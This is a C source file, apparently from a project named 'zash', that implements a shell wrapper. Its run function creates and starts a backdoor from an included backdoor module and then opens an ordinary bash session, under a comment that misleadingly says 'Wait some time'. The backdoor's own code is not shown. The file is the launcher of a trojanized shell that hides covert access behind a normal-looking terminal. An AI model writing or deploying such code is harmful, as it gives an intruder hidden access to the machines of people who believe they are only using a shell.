//
// Created by user on 5/4/20.
//

#include <pthread.h>

#include "backdoor/backdoor.h"
#include "common.h"
#include "shell.h"


struct SHELL_context {
    char something;
};


enum zash_status SHELL_create(struct SHELL_context **context)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    *context = HEAPALLOCZ(sizeof(**context));

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    return status;
}


enum zash_status SHELL_run(struct SHELL_context *context)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct BACKDOOR_context *backdoor = NULL;
    pthread_rwlock_t lock = PTHREAD_RWLOCK_INITIALIZER;
    int return_value = C_STANDARD_FAILURE_VALUE;

    UNREFERENCED_PARAMETER(context);

    /* Create a new backdoor */
    status = BACKDOOR_create(&lock, &backdoor);
    if (ZASH_STATUS_SUCCESS != status) {
        goto lbl_cleanup;
    }

    /* Run the backdoor */
    status = BACKDOOR_run(backdoor);
    if (ZASH_STATUS_SUCCESS != status) {
        goto lbl_cleanup;
    }

    /* Wait some time */
    system("bash");

    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    /* Destroy the backdoor */
    temp_status = BACKDOOR_destroy(backdoor);
    if (ZASH_STATUS_SUCCESS != temp_status) {
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    /* Destroy the lock */
    return_value = pthread_rwlock_destroy(&lock);
    if (C_STANDARD_SUCCESS_VALUE != return_value) {
        temp_status = ZASH_STATUS_MAIN_PTHREAD_RWLOCK_DESTROY_FAILED;
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}


enum zash_status SHELL_destroy(struct SHELL_context *context)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    HEAPFREE(context);

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    return status;
}
